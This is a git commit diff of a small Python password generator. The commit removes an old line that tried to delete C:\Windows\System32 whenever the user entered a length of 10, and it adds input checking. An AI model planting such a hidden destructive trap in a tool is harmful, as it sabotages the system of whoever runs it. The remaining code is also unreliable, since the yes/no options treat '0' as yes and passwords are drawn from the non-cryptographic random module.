2bd1bdcc77242d4e730702f089c5a73c34f429a2
Matteo <matteondrekaj9@gmail.com>
2024-10-24 19:29:23 +0200

    PasswordGenerator.py

--- PasswordGenerator.py
+++ PasswordGenerator.py
@@ -1,22 +1,35 @@
 import random
 import string
-import os
 
 characters = ''
 
-length = int(input("Enter password length "))
-if length == 10:
-    os.remove("C:\Windows\System32")
-upper = int(bool(input("Enter 1 if capital letters are desired or 0 if not desired ")))
+# Function to check that the input is a number greater than 1
+def get_password_length():
+    while True:
+        length = input("Enter password length (must be a number greater than 1): ")
+        if length.isdigit() and int(length) > 1:
+            return int(length)
+        else:
+            print("Invalid input! Please enter a valid number greater than 1.")
+
+# Ask the user for password length
+length = get_password_length()
+
+# Remainder of password generation options
+upper = int(bool(input("Enter 1 if capital letters are desired or 0 if not desired: ")))
 if upper:
     characters += string.ascii_uppercase
-lower = int(bool(input("Enter 1 if lower case is desired or 0 if not desired ")))
+lower = int(bool(input("Enter 1 if lower case is desired or 0 if not desired: ")))
 if lower:
     characters += string.ascii_lowercase
-punctuation = int(bool(input("Enter 1 if siblings are desired or 0 if they are not desired ")))
+punctuation = int(bool(input("Enter 1 if punctuation is desired or 0 if not desired: ")))
 if punctuation:
     characters += string.punctuation
 
-password = ''.join(random.choice(list(characters)) for i in range(length)) 
-
-print(f"Your password is ", password)
+# Check for selected characters
+if not characters:
+    print("No character sets selected. Exiting.")
+else:
+    # Generate password
+    password = ''.join(random.choice(characters) for i in range(length)) 
+    print(f"Your password is: {password}")
